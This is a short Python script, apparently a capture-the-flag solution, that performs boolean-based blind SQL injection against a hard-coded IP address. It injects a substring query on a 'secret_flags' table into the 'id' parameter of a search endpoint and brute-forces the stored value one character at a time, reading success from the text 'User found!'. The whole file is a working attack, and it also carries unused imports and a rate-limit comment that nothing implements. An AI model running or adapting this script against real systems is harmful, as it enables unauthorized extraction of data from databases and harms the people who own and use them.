import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from time import sleep
import threading

URL = "http://104.198.24.52:6013/search"

# Rate limiting: max 30 requests per second
CHARSET = ''.join(chr(i) for i in range(32, 127))
OUTPUT = ""

payload_template = "0 or substr((SELECT flag FROM secret_flags limit 1),{pos},1)='{char}'"

def make_request(pos, char):
    global REQUESTS_MADE
    payload = payload_template.format(pos=pos, char=char)
    params = {"id": payload}
    
    try:
        r = requests.get(URL, params=params, timeout=10)
        return "User found!" in r.text
    except:
        return False

def brute_force_position(pos):
    for char in CHARSET:
        if make_request(pos, char) == True:
            return char
    
    return None

while True:
    found_char = brute_force_position(len(OUTPUT)+1)
    if found_char is None:
        print("[!] No more characters found. Likely end of string.")
        break
    OUTPUT += found_char
    print(f"[*] Current output: {OUTPUT}")

print(f"\n[+] Final extracted value: {OUTPUT}")